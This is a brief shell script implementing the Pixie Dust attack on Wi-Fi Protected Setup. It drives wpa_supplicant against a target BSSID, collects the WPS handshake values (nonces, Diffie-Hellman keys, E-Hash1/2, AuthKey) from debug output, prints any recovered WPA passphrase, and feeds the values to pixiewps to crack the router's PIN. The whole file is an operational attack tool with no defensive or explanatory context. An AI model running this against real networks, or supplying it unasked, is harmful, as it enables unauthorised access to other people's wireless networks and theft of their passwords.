#!/bin/sh

TEMPDIR=$(mktemp -d)
TEMPFILE=$(mktemp --suffix=.conf)
IFACE="wlan0mon"

BSSID=$1
PIN=$2

function cleanup() 
{
	PID=$(jobs -l | awk '{print $2}')
	kill $PID
	rm -rf $TEMPDIR $TEMPFILE $PIPE
}

function gethex()
{
	echo $1 | cut -d : -f 3 | sed --expression='s/ //g'
}

#Start here
#Write wpa_supplicant config to file
echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE

#Send WPS_REG command to wpa_supplicant socket
sleep 2 && echo "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &

#Launch wpa_supplicant & parse output
while read -r LINE
do
	if [ "$(echo "$LINE" | grep 'Enrollee Nonce')" ] && [ ! "$ENONCE" ]
	then
		ENONCE=$(gethex "$LINE")
		echo "E-Nonce=$ENONCE"
	fi

	if [ "$(echo "$LINE" | grep 'DH Private Key')" ] && [ ! "$PKR" ]
	then
		PKR=$(gethex "$LINE")
		echo "PKR=$PKR"
	fi

	if [ "$(echo "$LINE" | grep 'DH peer Public Key')" ] && [ ! "$PKE" ]
	then
		PKE=$(gethex "$LINE")
		echo "PKE=$PKE"
	fi

	if [ "$(echo "$LINE" | grep 'AuthKey')" ]
	then
		AUTHKEY=$(gethex "$LINE")
		echo "AuthKey=$AUTHKEY"
	fi
	if [ "$(echo "$LINE" | grep 'E-Hash1')" ]
	then
		EHASH1=$(gethex "$LINE")
		echo "E-Hash1=$EHASH1"
	fi
	if [ "$(echo "$LINE" | grep 'E-Hash2')" ]
	then
		EHASH2=$(gethex "$LINE")
		echo "E-Hash2=$EHASH2"
	fi
	
	if [ "$(echo "$LINE" | grep 'Network Key')" ]
	then
		WPA_KEY=$(gethex "$LINE")
		echo "WPA pass: $WPA_KEY"
	fi

	if [ "$PKE" ] && [ "$PKR" ] && [ "$EHASH1" ] && [ "$EHASH2" ] && [ "$ENONCE" ]
	then
		break
	fi

done <<<$(wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE | tee /tmp/log | awk '$1 == "WPS:" {print $0}')

#Launch pixiewps to get real pin
pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force

#Remove temp files and exit
cleanup
